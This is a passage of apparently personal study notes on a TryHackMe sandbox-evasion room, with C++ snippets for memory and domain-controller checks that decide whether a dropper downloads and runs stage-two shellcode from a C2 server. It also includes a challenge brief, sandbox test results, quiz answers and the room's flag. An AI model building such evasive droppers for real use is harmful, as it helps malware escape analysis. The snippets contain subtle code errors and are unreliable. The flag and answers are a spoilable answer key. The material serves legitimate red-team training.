@@ -250,3 +250,130 @@ BOOL memoryCheck() {
 // Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    
     GlobalMemoryStatusEx(&statex);
 // Checks if the System Memory is greater than 5.00GB    
+    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {        
+       return TRUE;    
+    } else {        
+       return FALSE;
+    }
+}
+```
+This code can be broken down into the following steps:
+We're creating a new function (memoryCheck) that will return True or False.
+We use the previous code from above to get the size of the system memory.
+We check if the system memory is greater than 5GB; if it is true, we return TRUE; if false, we return FALSE.
+The value returned from the function determines if we download and execute stage 2 or not.
+Testing our Code
+Now that we have finished the second of our third Sandbox Evasion method, it is important that we test it to ensure that it works. To do so, we are going to upload our files to Any.Run
+One with the Memory Check function
+One without the Memory Check function
+Looking at the two samples side by side shows some interesting differences; in the first submission, our memory check function works without any issue and gracefully exits the program when it notices the device has less than 5GB of RAM.
+https://app.any.run/tasks/e2f6a64b-02ef-43ca-bea5-e724b234001c
+https://app.any.run/tasks/7d06fc67-35c9-45f5-8865-af9dd6486075
+Screenshot from Any.Run verifying that our Memory Check function worked as intended
+In our unmodified, original code, we can see the HTTP GET Request to go out to an AWS Web Server to get Stage two.
+Screenshot from Any.Run showing an outbound HTTP Request
+This shows that our code functions as intended! We can now move on to one of our final bypass categories - Querying Network Information.
+Querying Network Information
+For our last evasion technique, we will be querying information about the Active Directory domain. We will be keeping it simple by querying the name of a Domain Controller using the [NetGetDCName](https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netgetdcname) Windows API. This is a relatively simple Windows API that fetches the primary domain controller within the environment. This requires us to specify a pointer to a string for the DC Name to be put into. Implementing the function in C++ looks like so:
+```text
+BOOL isDomainController(){
+// Create a long pointer to Wide String for our DC Name to live in
+    LPCWSTR dcName;  
+// Query the NetGetDCName Win32 API for the Domain Controller Name
+    NetGetDCName(NULL, NULL, (LPBYTE *) &dcName);
+// Convert the DCName from a Wide String to a String
+    wstring ws(dcName);
+    string dcNewName(ws.begin(), ws.end());
+// Search if the UNC path is referenced in the dcNewName variable. If so, there is likely a Domain Controller present in the environment. If this is true, pass the check, else, fail.
+    if ( dcNewName.find("\\\\"){
+          return TRUE;
+    } else {
+          return FALSE;
+    }
+}
+```
+This code can be broken down into the following steps:
+Declare two variables; one string, one LPCWSTR. The NetGetDCName WinAPI returns only an LPCWSTR.
+Invoke the NetGetDCName Windows API. Two null values will be specified because we do not know the Server Name or the Domain Name of the environment we may be in
+We convert the LPCWSTR to a normal string variable to check and see if the value is NULL (or, in the case of a string, "").
+Execute the comparison statement and return True or False depending on the device name.
+This will then call back to the Main() function which will then evaluate if it needs to download and execute our shellcode from the C2 Server. The Main function now looks like so:
+```text
+int main() {
+    if (isDomainController == TRUE) {
+        downloadAndExecute();
+    } else {
+        cout << "Domain Controller Not Found!";
+    }
+}
+```
+Testing our Code
+For our last Sandbox analysis, we will be using VirusTotal. Looking at the results of the SysInternals Sandbox, we can see that our Sandbox evasion technique worked. No outbound request to Cloudflare was made.
+The Screenshot above shows that our malware did not reach out to our C2 Server.
+The Screenshot above shows that our malware reached out to our C2 Server for the second stage.
+Adding External Dependencies in Visual Studio
+For the final evasion method, we must add a new DLL to the project file. To do so, ensure your project is first opened. After it is opened, right-click on the Project name in the "Solution Explorer". In the image below, the Project name is called "Console Application2":
+Click Properties at the bottom of the list; this will open a new view. Expand the "Linker" tab and select the "Input" submenu. We are interested in adding the Netapi32 Library.
+To do so, click on the right side with all of the libraries referenced and add Netapi32.lib. Once it is added (like in the screenshot depicted above), press the "Apply" button and "Ok" to close the window and you are ready to continue development!
+Wrapping Up Implementations
+Now that you are more familiar with implementing various Sandbox Evasion techniques, we will be moving on to a Sandbox evasion challenge in the next task. You will be required to integrate multiple bypasses together to evade the "Custom" TryHackMe Sandbox. All source code has been provided in full to help those out who may not be as familiar with C++.
+Read about implementing various Sandbox evasion techniques.
+*No answer needed*
+Which evasion method involves reaching out to a host to identify your IP Address?
+*Geolocation Filtering*
+Which evasion technique involves burning compute-time to escape the sandbox?
+*Sleeping*
+### DIY Sandbox Evasion Challenge
+The Great Escape
+Now that you have gained some experience in escaping Sandboxes, it's time for a challenge! In this task, you will be utilizing the code from Task 4 to implement the "Ultimate Sandbox Evasion" method to escape TryHackMe's Sandbox program! In order to escape the Sandbox, you must implement the following techniques:
+Check and see if the device is joined to an Active Directory Domain
+Check if the system memory is greater than 1GB of RAM
+Implement an outbound HTTP request to 10.10.10.10
+Implement a 60-second sleep timer before your payload is retrieved from your web server
+If your dropper meets these requirements specified above, the flag will be printed out to you.
+Good luck and have fun!
+As a reminder, Task 4 contains downloadable source code from the four examples that may assist you in your Sandbox Evasion techniques. This material can also be found on the VM at C:\Users\Administrator\Desktop\Materials.
+The Sandbox Evasion Techniques can fail. The program analyzes the binary to see if the checks are implemented. The outbound device may not have internet access - as long as the checks are implemented, the sandbox check should succeed.
+Sandbox Evasion Binary
+When you are finished developing your payload and are ready to test your evasion methods,  you can find the binary to check your dropper in C:\Users\Administrator\Desktop\Materials\SandboxChecker.exe. Below is an example to show you how the program works:
+```text
+C:\Users\Administrator\Desktop\Materials\> .\SandboxChecker.exe C:\Users\TryHackMe\Materials\SandboxEvasion.exe
+[+] Memory Check found!
+[+] Network Check found!
+[+] GeoFilter Check found!
+[+] Sleep Check found!
+Congratulations! Here is your flag:
+```
+Create your own Sandbox Evasion executable using the code snippets in the task and the VM as reference.
+Run the "SandboxChecker.exe" in a command prompt (example above) providing your executable as the argument. All checks must be implemented correctly for the flag to reveal.
+Note: If you have done it right, the "Sleep Check" will take approximately one minute to reveal the flag.
+Note: If your DNS check has if(dcNewName.find("\\")) instead of if(dcNewName.find("\\\\")) then you may have difficulties with the sleep check.
+Make sure your Sleep check is before your Domain Controller Check if you're having issues with it.
+![[Pasted image 20220911091828.png]]
+![[Pasted image 20220911091838.png]]
+![[Pasted image 20220911091923.png]]
+(found in dropper.cpp my code)
+### Wrapping Up
+Wrapping Up
+In this room, we covered some modern and historic Sandbox evasion techniques that have been used by both red teamers and advanced threat actors alike. After finishing up this room, you should now have a general understanding of what a malware sandbox is, methods that you could try to use to evade it, and even some template code that you can build off of.
+This is by no means a fully comprehensive list of all of the Sandbox Evasion methods out there; we highly encourage you to go out and develop your own Sandbox Evasion techniques with the foundational knowledge learned from this room.
+Read the closing task.
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/a2e2d18182fe38e0f8709aafae9c33bc.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e573e6b24f5adab546ec0034be6537d2.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/423f07b56f8ce5f9d353c3b96d0f0f35.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/cce67bc687e464e7ac65617233fe2c78.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/4f9474a7e5ca35c0b58e09702fd966d7.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/c5760cd217e139d3e40161fc901563b1.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/18f24c068bf41867bb839c910c192de5.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1fb4c21ee81b9a5f979dba972c6e08ee.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/be3ab6bfe807a0151ae966bf46b5084c.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/792c6e1f9369ec2b0cb73f712a793bc3.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/86020176cb2a5e8aed2e142d888cd3d4.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/5c8865dcd04ae30c2fc6c41c42386484.png)
+- ***THM{6c1f95ec}***
+
+## Notes / Lessons Learned
+[[Windows Internals]]
+
